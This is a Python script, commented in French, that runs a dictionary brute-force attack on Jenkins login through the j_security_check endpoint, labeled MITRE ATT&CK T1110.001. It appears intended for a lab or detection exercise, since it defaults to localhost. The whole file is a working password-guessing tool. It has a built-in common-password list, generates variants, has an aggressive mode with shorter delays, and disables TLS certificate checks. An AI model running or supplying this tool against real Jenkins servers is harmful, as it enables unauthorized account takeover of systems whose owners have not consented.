#!/usr/bin/env python3
"""
Script d'attaque Brute Force sur Jenkins
Simule une attaque par dictionnaire sur l'authentification Jenkins
MITRE ATT&CK: T1110.001 - Brute Force: Password Guessing
"""

import requests
import time
import argparse
from datetime import datetime
import random
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class JenkinsBruteForce:
    def __init__(self, base_url, target_user="admin"):
        self.base_url = base_url.rstrip('/')
        self.target_user = target_user
        self.attempts = 0
        self.success = False
        
    def attempt_login(self, username, password):
        """Tentative d'authentification"""
        try:
            session = requests.Session()
            
            # Tentative 1: Via /j_security_check (ancienne méthode)
            login_url = f"{self.base_url}/j_security_check"
            data = {
                'j_username': username,
                'j_password': password,
                'from': '/',
                'Submit': 'Sign in'
            }
            
            response = session.post(login_url, data=data, allow_redirects=False, verify=False)
            self.attempts += 1
            
            # Vérifier si l'authentification a réussi
            if response.status_code == 302 and 'loginError' not in response.headers.get('Location', ''):
                print(f"[{datetime.now()}] ✓ SUCCESS - {username}:{password} [HTTP {response.status_code}]")
                self.success = True
                return True
            else:
                print(f"[{datetime.now()}] ✗ FAILED - {username}:{password} [HTTP {response.status_code}]")
                return False
                
        except Exception as e:
            print(f"[{datetime.now()}] ERROR - {username}:{password} - {e}")
            return False
    
    def dictionary_attack(self, password_list, delay=0.5):
        """Attaque par dictionnaire"""
        print(f"\n[{datetime.now()}] === DÉBUT ATTAQUE BRUTE FORCE ===")
        print(f"  - Cible: {self.base_url}")
        print(f"  - Utilisateur ciblé: {self.target_user}")
        print(f"  - Nombre de mots de passe à tester: {len(password_list)}")
        print(f"  - Délai entre tentatives: {delay}s\n")
        
        for password in password_list:
            if self.success:
                break
                
            self.attempt_login(self.target_user, password)
            time.sleep(delay)
        
        print(f"\n[{datetime.now()}] === FIN ATTAQUE BRUTE FORCE ===")
        print(f"  - Tentatives totales: {self.attempts}")
        print(f"  - Succès: {'OUI' if self.success else 'NON'}\n")

def load_password_list(file_path=None):
    """Charge une liste de mots de passe"""
    if file_path:
        with open(file_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    
    # Liste par défaut (mots de passe communs)
    return [
        "admin",
        "password",
        "123456",
        "jenkins",
        "admin123",
        "letmein",
        "welcome",
        "monkey",
        "dragon",
        "master",
        "jenkins123",
        "password123",
        "qwerty",
        "abc123",
        "12345678",
        "Admin@123",
        "Jenkins@2024",
        "root",
        "toor",
        "administrator"
    ]

def generate_variants(base_passwords):
    """Génère des variantes des mots de passe"""
    variants = []
    for pwd in base_passwords:
        variants.append(pwd)
        variants.append(pwd.capitalize())
        variants.append(pwd.upper())
        variants.append(pwd + "123")
        variants.append(pwd + "!")
        variants.append(pwd + "@2024")
    return list(set(variants))  # Éliminer les doublons

def main():
    parser = argparse.ArgumentParser(description="Attaque Brute Force sur Jenkins")
    parser.add_argument('--target', default='http://localhost:8080', 
                        help='URL de Jenkins')
    parser.add_argument('--user', default='admin', 
                        help='Utilisateur cible')
    parser.add_argument('--passwords', 
                        help='Fichier contenant la liste de mots de passe')
    parser.add_argument('--duration', type=int, 
                        help='Durée maximale de l\'attaque en secondes')
    parser.add_argument('--delay', type=float, default=0.5, 
                        help='Délai entre les tentatives (secondes)')
    parser.add_argument('--aggressive', action='store_true',
                        help='Mode agressif (délai réduit, plus de variantes)')
    
    args = parser.parse_args()
    
    # Charger ou générer la liste de mots de passe
    base_passwords = load_password_list(args.passwords)
    
    if args.aggressive:
        password_list = generate_variants(base_passwords)
        args.delay = max(0.1, args.delay / 2)
    else:
        password_list = base_passwords
    
    # Mélanger la liste pour plus de réalisme
    random.shuffle(password_list)
    
    # Si durée limitée, calculer le nombre max de tentatives
    if args.duration:
        max_attempts = int(args.duration / args.delay)
        password_list = password_list[:max_attempts]
    
    # Créer l'attaquant
    attacker = JenkinsBruteForce(args.target, args.user)
    
    # Lancer l'attaque
    start_time = time.time()
    attacker.dictionary_attack(password_list, args.delay)
    duration = time.time() - start_time
    
    print(f"\n[{datetime.now()}] === STATISTIQUES ===")
    print(f"  - Durée totale: {duration:.2f}s")
    print(f"  - Tentatives: {attacker.attempts}")
    print(f"  - Taux: {attacker.attempts/duration:.2f} tentatives/seconde")

if __name__ == "__main__":
    main()
